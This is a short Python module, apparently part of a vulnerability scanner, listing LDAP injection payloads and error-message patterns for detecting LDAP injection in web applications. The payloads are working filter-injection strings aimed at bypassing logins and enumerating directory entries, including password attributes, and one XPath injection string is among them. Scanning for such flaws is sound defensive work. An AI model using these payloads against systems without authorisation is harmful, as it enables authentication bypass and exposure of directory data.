"""Payloads para detección de LDAP Injection."""

QUICK_PAYLOADS = [
    "*",
    "admin*",
    "*)(uid=*))(|(uid=*",
    "*)(&",
    "*)(|(password=*)",
    "admin)(&)",
    "*()|%26'",
    "*)(cn=*",
    "admin)(|(objectclass=*)",
    "*))%00",
]

FULL_PAYLOADS = [
    "admin*)(|(uid=*",
    "*)(uid=admin",
    "admin))(|(uid=*",
    "*))(|(cn=*",
    "x)(|(cn=*",
    "admin)(!(cn=*))",
    "*)(objectClass=*",
    "*)(|(mail=*@*))",
    "admin)(|(sn=*",
    "*(|(objectclass=*))",
    "*)(&(objectclass=user))",
    "admin*)(cn=*",
    "x' OR name()='username' OR 'x'='y",
    ")(cn=))(|(cn=*",
    "admin)(|(userPassword=*))",
]

# Patrones que indican LDAP injection
DETECTION_PATTERNS = [
    "ldap_search",
    "ldap_bind",
    "invalid dn syntax",
    "bad search filter",
    "ldap error",
    "active directory",
    "cn=",
    "dc=",
    "ou=",
    "objectclass",
    "distinguished name",
]
